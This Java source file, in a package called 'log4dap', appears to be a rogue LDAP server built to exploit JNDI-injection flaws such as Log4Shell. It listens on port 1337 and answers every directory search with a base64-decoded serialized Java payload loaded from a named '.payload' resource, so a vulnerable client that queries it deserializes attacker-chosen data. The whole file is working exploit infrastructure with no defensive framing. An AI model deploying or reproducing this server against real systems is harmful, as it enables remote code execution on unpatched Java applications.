
package log4dap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import java.io.InputStream;
import java.net.InetAddress;
import java.net.URL;
import java.util.ArrayList;

public  class  LDAPServer  {
    private  static  final String LDAP_BASE = "dc=example,dc=com" ;

    public  static  void  main  (String[] tmp_args)  throws Exception {

        String[] args = new String[]{ "http://localhost/#e"}; 
        int port = 1337 ;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs( new InMemoryListenerConfig(
                "listen" ,
                InetAddress.getByName( "0.0.0.0" ), 
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor( new OperationInterceptor( new URL(args[ 0 ])));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println( "Listening on 0.0.0.0:" + port); 
        ds.startListening();
    }

    private  static  class  OperationInterceptor  extends  InMemoryOperationInterceptor  {

        private URL codebase;

        public  OperationInterceptor  (URL cb)  {
            this.codebase = cb;
        }

        @Override
        public  void  processSearchResult  (InMemoryInterceptedSearchResult result)  {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected  void  sendResult  (InMemoryInterceptedSearchResult result, String base, Entry e)  throws Exception {

            System.out.println( "Received LDAP request from: " + result.getConnectedAddress());

            URL turl = new URL( this.codebase, this.codebase.getRef().replace( '.' , '/' ).concat( ".class" ));
            System.out.println( "Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute( "javaClassName" , base );

            String payload = "";

            if (base.trim().equalsIgnoreCase(""))
            {
                System.out.println("No payload specified, sending empty response");
            }
            else if (Thread.currentThread().getContextClassLoader().getResource(base + ".payload") == null)
            {
                System.out.println("Specified payload not supported, sending empty response");
            }
            else {
                InputStream payloadStream = Thread.currentThread().getContextClassLoader().getResourceAsStream(base + ".payload");
                payload = new String(payloadStream.readAllBytes());
            }

            e.addAttribute( "javaSerializedData" , Base64.decode( payload ));

            result.sendSearchEntry(e);
            result.setResult( new LDAPResult( 0 , ResultCode.SUCCESS));
        }
    }
}